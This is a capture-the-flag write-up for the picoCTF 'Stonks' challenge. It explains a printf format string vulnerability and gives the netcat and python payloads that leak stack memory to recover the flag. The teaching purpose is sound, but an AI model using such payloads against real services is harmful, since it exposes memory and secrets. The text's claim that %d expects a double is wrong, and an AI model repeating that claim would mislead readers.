# Stonks

A vulnerable server is running on

```
nc mercury.picoctf.net 6989
```

and we have the source code available in the file `vuln.c`. Looking at this file we find the vulnerability in line `93`. What we have is a so called `format string vulnerability`, meaning the code receives user input (`scanf` in line `91`) and prints this input without specifying a format string. According to specification, printf is supposed to be called in the following way:

```
printf(const char *format_string, input)
```

The format string can be an arbitrary string, as can be seen in line `24`in vuln.c, but it may also contain format parameters which specify to the function the type of other inputs it is passed. This can be seen in line `35` which reads:

```
printf("%d shares of %s\n", head->shares, head->symbol);
```

The `%d` format parameter specifies to the function that it has to expect a double as its second input and the `%s` informs of a string as the third input.

In the vulnerable part of the code the user's input is passed to printf without specifying the format string, which essentially enables the user to pass a format parameter as an input. Most of these will cause the program to crash or do nothing, however one can also pass specific format parameters that will let the program regard the the adjacent bytes on the stack as its inputs and print them to the screen. An attempt to illustrate this can be seen in the below figure:

![](format_string.png)

this means that, if done correctly, the person exploiting the system can read from areas of memory they are not supposed to access as the user, in this case communicating with a server on the internet. For example executing the following command:

```
echo "1%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x" | nc mercury.picoctf.net 6989
```

will result in the following output:

```
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
09ee1470.0804b000.080489c3.f7fa9d80.ffffffff.00000001.09edf160.f7fb7110.f7fa9dc7.00000000
...
```
The one in the format string is necessary to select the `Buy some stonks!`-option and the following 10 `%08x`s tells printf to print whatever sits next to the format string within the memory of the remote server to be printed in zero-padded, eight digit hexadecimal format. Conveniently it is even possible to separate each block of 8 digits representing 4 bytes (as its in hex) by dots to work with it more easily.

From the code it is actually clear that we can input a format string of lenth 300, because this is he buffer size specified in the scanf function. we can use python to generate a payload that will extract as much memory as possible from the server and hope that our flag is somewhere in there. We can use the following command (which is also the content of the exploit.sh file) for construct the payload, pipe it into netcat, truncate it using grep and then pipe this turuncated output into a small python script that will locate the flag within the memory dump.

```
python3 -c "print('1::::'+56*'%08x.')" | nc mercury.picoctf.net 6989 | grep :::: | python3 print_flag.py
```
This will return the flag:
```
picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}
```

## Resources

https://owasp.org/www-community/attacks/Format_string_attack  
https://cs155.stanford.edu/papers/formatstring-1.2.pdf
